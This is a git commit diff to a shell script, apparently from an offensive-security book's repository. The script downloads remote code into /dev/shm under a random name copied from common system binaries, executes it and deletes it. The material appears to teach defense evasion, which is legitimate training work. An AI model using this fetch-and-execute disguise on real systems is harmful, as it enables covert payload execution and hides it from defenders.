5edb133046f1ae70b78f5d62c4d469425e2ef3a1
Dolev Farhi <farhi.dolev@gmail.com>
2023-12-01 12:23:51 -0500

    update

--- ch12/binary_name_rotation.sh
+++ ch12/binary_name_rotation.sh
@@ -3,7 +3,7 @@ RANDOM_BIN_NAMES=("ls" "touch" "mkdir" "fdisk" "zip" "pslog" "tree" "gunzip")
 RANDOMIZE=$(( (RANDOM % 7)  + 0))
 BIN_NAME="/dev/shm/${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
 
-if command -v curl; then
+if command -v curl 1> /dev/null; then
     curl -s "https://raw.githubusercontent.com/dolevf/Black-Hat-Bash/master/ch12/raw_code.txt" -o "${BIN_NAME}"
     bash "${BIN_NAME}"
     rm "${BIN_NAME}"
